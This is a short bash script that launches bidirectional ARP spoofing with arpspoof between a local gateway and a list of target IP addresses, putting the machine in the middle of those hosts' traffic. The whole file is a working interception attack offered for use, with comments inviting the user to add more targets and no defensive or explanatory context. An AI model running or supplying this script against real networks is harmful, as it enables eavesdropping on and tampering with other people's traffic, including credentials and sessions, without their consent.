#!/bin/bash

# Define your network interface and gateway IP
INTERFACE="wlan0"
GATEWAY="192.168.0.1"

# List of target IPs
TARGETS=("192.168.0.149") # Add your IPs here
# TARGETS=("192.168.0.120" "192.168.0.200" "192.168.0.121") # Add your IPs here

# Start arpspoof for each target
for TARGET in "${TARGETS[@]}"
do
    echo "Spoofing target $TARGET..."
    sudo arpspoof -i $INTERFACE -t $TARGET $GATEWAY &
    sudo arpspoof -i $INTERFACE -t $GATEWAY $TARGET &
done

# Wait for all background processes to finish
wait
